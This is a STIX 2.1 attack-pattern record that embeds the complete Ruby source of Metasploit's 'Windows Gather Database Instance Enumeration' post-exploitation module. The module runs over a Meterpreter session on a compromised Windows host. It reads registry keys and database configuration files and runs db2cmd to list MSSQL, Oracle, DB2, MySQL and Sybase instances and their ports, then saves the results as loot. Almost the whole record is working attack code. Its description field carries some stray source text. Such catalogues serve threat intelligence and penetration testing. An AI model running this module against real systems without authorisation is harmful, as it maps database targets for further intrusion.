{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--14e2c045-18d4-41aa-bacf-ef68d8999827",
    "created": "2024-08-14T16:33:05.010883Z",
    "modified": "2024-08-14T16:33:05.010886Z",
    "name": "Windows Gather Database Instance Enumeration",
    "description": "This module will enumerate a windows system for installed database instances 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_db.rb",
            "external_id": "enum_db.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Database Instance Enumeration',\n        'Description' => %q{ This module will enumerate a windows system for installed database instances },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Barry Shteiman <barry[at]sectorix.com>', # Module author\n          'juan vazquez' # minor help\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_search\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  # method called when command run is issued\n  def run\n    results = []\n\n    print_status(\"Enumerating Databases on #{sysinfo['Computer']}\")\n    if check_mssql\n      results += enumerate_mssql\n    end\n    if check_oracle\n      results += enumerate_oracle\n    end\n    if check_db2\n      results += enumerate_db2\n    end\n    if check_mysql\n      results += enumerate_mysql\n    end\n    if check_sybase\n      results += enumerate_sybase\n    end\n\n    if results.empty?\n      print_status('Done, No Databases were found')\n      return\n    end\n\n    print_status('Done, Databases Found.')\n\n    tbl = Rex::Text::Table.new(\n      'Header' => 'Installed Databases',\n      'Indent' => 1,\n      'Columns' =>\n        [\n          'Type',\n          'Instance',\n          'Database',\n          'Port'\n        ]\n    )\n\n    results.each do |r|\n      report_service(host: session.sock.peerhost, port: r[3], name: r[0], info: \"#{r[0]}, #{r[1]}\")\n      tbl << r\n    end\n\n    print_line(tbl.to_s)\n    p = store_loot('host.databases', 'text/plain', session, tbl.to_s, 'databases.txt', 'Running Databases')\n    print_good(\"Results stored in: #{p}\")\n  end\n\n  ##### initial identification methods #####\n\n  # method for Checking if database instances are installed on host - mssql\n  def check_mssql\n    key = 'HKLM\\\\SOFTWARE\\\\Microsoft'\n    if registry_enumkeys(key).include?('Microsoft SQL Server')\n      print_status(\"\\tMicrosoft SQL Server found.\")\n      return true\n    end\n    return false\n  rescue StandardError\n    return false\n  end\n\n  # method for Checking if database instances are installed on host - oracle\n  def check_oracle\n    key = 'HKLM\\\\SOFTWARE\\\\Oracle'\n    if registry_enumkeys(key).include?('ALL_HOMES')\n      print_status(\"\\tOracle Server found.\")\n      return true\n    elsif registry_enumkeys(key).include?('SYSMAN')\n      print_status(\"\\tOracle Server found.\")\n      return true\n    elsif registry_enumkeys(key).include?('KEY_XE')\n      print_status(\"\\tOracle Server found.\")\n      return true\n    end\n    return false\n  rescue StandardError\n    return false\n  end\n\n  # method for Checking if database instances are installed on host - db2\n  def check_db2\n    key = 'HKLM\\\\SOFTWARE\\\\IBM\\\\DB2'\n    if registry_enumkeys(key).include?('GLOBAL_PROFILE')\n      print_status(\"\\tDB2 Server found.\")\n      return true\n    end\n    return false\n  rescue StandardError\n    return false\n  end\n\n  # method for Checking if database instances are installed on host - mysql\n  def check_mysql\n    key = 'HKLM\\\\SOFTWARE'\n    if registry_enumkeys(key).include?('MySQL AB')\n      print_status(\"\\tMySQL Server found.\")\n      return true\n    end\n    return false\n  rescue StandardError\n    return false\n  end\n\n  # method for Checking if database instances are installed on host - sybase\n  def check_sybase\n    key = 'HKLM\\\\SOFTWARE\\\\Sybase'\n    if registry_enumkeys(key).include?('SQLServer')\n      print_status(\"\\tSybase Server found.\")\n      return true\n    elsif registry_enumkeys(key).include?('Server')\n      print_status(\"\\tSybase Server found.\")\n      return true\n    end\n    return false\n  rescue StandardError\n    return false\n  end\n\n  ##### deep analysis methods #####\n\n  # method to identify mssql instances\n  def enumerate_mssql\n    results = []\n    key = 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Microsoft SQL Server\\\\Instance Names\\\\SQL'\n    instances = registry_enumvals(key)\n    if !instances.nil? && !instances.empty?\n      instances.each do |i|\n        tcpkey = \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Microsoft SQL Server\\\\#{registry_getvaldata(key, i)}\\\\MSSQLServer\\\\SuperSocketNetLib\\\\Tcp\\\\IPAll\"\n        tcpport = registry_getvaldata(tcpkey, 'TcpPort')\n        print_good(\"\\t\\t+ #{registry_getvaldata(key, i)} (Port:#{tcpport})\")\n        results << ['mssql', \"instance:#{registry_getvaldata(key, i)} port:#{tcpport}\", 'Microsoft SQL Server', tcpport]\n      end\n    end\n    return results\n  rescue StandardError\n    print_error(\"\\t\\t! could not identify information\")\n    return results || []\n  end\n\n  # method to identify oracle instances\n  def enumerate_oracle\n    results = []\n    found_key = false\n    basekey_set = ['HKLM\\\\SOFTWARE\\\\Oracle\\\\SYSMAN', 'HKLM\\\\SOFTWARE\\\\ORACLE\\\\KEY_XE']\n    basekey_set.each do |basekey|\n      next if found_key\n\n      instances = registry_enumkeys(basekey)\n      if instances.nil? || instances.empty?\n        next\n      else\n        found_key = true\n      end\n\n      instances.each do |i|\n        if basekey.include? 'KEY_XE'\n          val_ORACLE_SID = registry_getvaldata(basekey, 'ORACLE_SID')\n          val_ORACLE_HOME = registry_getvaldata(basekey, 'ORACLE_HOME')\n        else\n          key = \"#{basekey}\\\\#{i}\"\n          val_ORACLE_SID = registry_getvaldata(key, 'ORACLE_SID')\n          val_ORACLE_HOME = registry_getvaldata(key, 'ORACLE_HOME')\n        end\n        if !exist?(val_ORACLE_HOME + '\\\\NETWORK\\\\ADMIN\\\\tnsnames.ora')\n          print_error(\"\\t\\t! #{val_ORACLE_SID} (No Listener Found)\")\n          next\n        end\n\n        data_TNSNAMES = read_file(val_ORACLE_HOME + '\\\\NETWORK\\\\ADMIN\\\\tnsnames.ora')\n        if data_TNSNAMES =~ /PORT\\ =\\ (\\d+)/\n          port = ::Regexp.last_match(1)\n          print_good(\"\\t\\t+ #{val_ORACLE_SID} (Port:#{port})\")\n          results << [ 'oracle', \"instance:#{val_ORACLE_SID} port:#{port}\", 'Oracle Database Server', port ]\n        else\n          print_error(\"\\t\\t! #{val_ORACLE_SID} (No Listener Found)\")\n        end\n      end\n    end\n    if !found_key\n      print_error(\"\\t\\t! Oracle instances not found\")\n    end\n    return results\n  rescue StandardError\n    print_error(\"\\t\\t! could not identify information\")\n    return results || []\n  end\n\n  # method to identify mysql instances\n  def enumerate_mysql\n    results = []\n    basekey = 'HKLM\\\\SOFTWARE\\\\MySQL AB'\n    instances = registry_enumkeys(basekey)\n    if instances.nil? || instances.empty?\n      return results\n    end\n\n    instances.each do |i|\n      key = \"#{basekey}\\\\#{i}\"\n      val_location = registry_getvaldata(key, 'Location')\n\n      data = find_mysql_conf(val_location)\n\n      if data && data =~ (/port=(\\d+)/)\n        port = ::Regexp.last_match(1)\n        print_good(\"\\t\\t+ MYSQL (Port:#{port})\")\n        results << ['mysql', \"instance:MYSQL port:#{port}\", 'MySQL Server', port]\n      else\n        print_error(\"\\t\\t! could not identify information\")\n      end\n    end\n    return results\n  rescue StandardError\n    print_error(\"\\t\\t! could not identify information\")\n    return results || []\n  end\n\n  # method to identify sybase instances\n  def enumerate_sybase\n    basekey = 'HKLM\\\\SOFTWARE\\\\Sybase\\\\SQLServer'\n    instance = registry_getvaldata(basekey, 'DSLISTEN')\n    location = registry_getvaldata(basekey, 'RootDir')\n    results = []\n\n    if !exist?(location + '\\\\ini\\\\sql.ini')\n      print_error(\"\\t\\t! could not locate configuration file.\")\n      return results\n    end\n\n    data = read_file(location + '\\\\ini\\\\sql.ini')\n    if data =~ /\\[#{instance}\\]([^\\[]*)/\n      segment = ::Regexp.last_match(1)\n    else\n      print_error(\"\\t\\t! couldnt locate information.\")\n      return results\n    end\n\n    if segment =~ /master=\\w+,[^,]+,(\\d+)/\n      port = ::Regexp.last_match(1)\n    else\n      print_error(\"\\t\\t! couldnt locate information.\")\n      return results\n    end\n\n    print_good(\"\\t\\t+ #{instance} (Port:#{port})\")\n    results << [ 'sybase', \"instance:#{instance} port:#{port}\", 'Sybase SQL Server', port ]\n    return results\n  rescue StandardError\n    print_error(\"\\t\\t! couldnt locate information.\")\n    return results || []\n  end\n\n  # method to identify db2 instances\n  def enumerate_db2\n    results = []\n    cmd_i = cmd_exec('db2cmd', '-i -w /c db2ilist')\n    cmd_p = cmd_exec('db2cmd', '-i -w /c db2 get dbm cfg')\n    if cmd_p =~ %r{\\ ?TCP/IP\\ Service\\ name\\ +\\(SVCENAME\\)\\ =\\ (\\w+)}\n      port = ::Regexp.last_match(1)\n    else\n      print_error(\"\\t\\t! could not identify instances information\")\n      return results\n    end\n\n    windir = session.sys.config.getenv('windir')\n    getfile = session.fs.file.search(windir + '\\\\system32\\\\drivers\\\\etc\\\\', 'services.*', recurse = true, timeout = -1)\n\n    data = nil\n    getfile.each do |file|\n      if exist?(\"#{file['path']}\\\\#{file['name']}\")\n        data = read_file(\"#{file['path']}\\\\#{file['name']}\")\n        break if !data.nil?\n      end\n    end\n\n    if data && data =~ (/#{port}[\\ \\t]+(\\d+)/)\n      port_t = ::Regexp.last_match(1)\n    else\n      print_error(\"\\t\\t! could not identify instances information\")\n      return results\n    end\n\n    cmd_i.split(\"\\n\").compact.each do |line|\n      stripped = line.strip\n      print_good(\"\\t\\t+ #{stripped} (Port:#{port_t})\")\n      results << [ 'db2', \"instance:#{stripped} port:#{port_t}\", 'DB2 Server', port_t ]\n    end\n\n    return results\n  rescue StandardError\n    print_error(\"\\t\\t! could not identify instances information\")\n    return results || []\n  end\n\n  ##### helper methods #####\n\n  def find_mysql_conf(val_location)\n    data = nil\n    if exist?(val_location + '\\\\my.ini')\n      data = read_file(val_location + '\\\\my.ini')\n    elsif exist?(val_location + '\\\\my.cnf')\n      data = read_file(val_location + '\\\\my.cnf')\n    else\n      sysdriv = session.sys.config.getenv('SYSTEMDRIVE')\n      getfile = session.fs.file.search(sysdriv + '\\\\', 'my.ini', recurse = true, timeout = -1)\n      getfile.each do |file|\n        if exist?(\"#{file['path']}\\\\#{file['name']}\")\n          data = read_file(\"#{file['path']}\\\\#{file['name']}\")\n          break\n        end\n      end\n    end\n    return data\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}